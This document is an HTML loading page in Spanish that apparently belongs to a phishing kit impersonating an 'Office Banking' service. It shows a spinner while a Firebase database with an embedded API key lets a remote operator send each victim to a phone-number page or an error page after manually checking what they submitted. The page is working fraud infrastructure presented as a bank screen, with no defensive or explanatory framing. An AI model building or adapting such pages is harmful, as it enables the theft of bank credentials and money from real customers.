
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cargando Datos...</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    body {
      background: white;
      color: red;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .dots span {
      display: inline-block;
      width: 10px;
      height: 10px;
      margin: 0 4px;
      background-color: red;
      border-radius: 50%;
      animation: blink 1.4s infinite both;
    }
    .dots span:nth-child(2) { animation-delay: 0.2s; }
    .dots span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
  </style>
</head>
<body>
  <h2>Cargando Datos...</h2>
  <div class="dots"><span></span><span></span><span></span></div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    db.ref("validacion_estado").on("value", snap => {
      const val = snap.val();
      if (val === "siguiente") {
        db.ref("validacion_estado").set("");
        window.location.href = "telefono.html";
      } else if (val === "error") {
        db.ref("validacion_estado").set("");
        window.location.href = "error.html";
      }
    });
  </script>
</body>
</html>
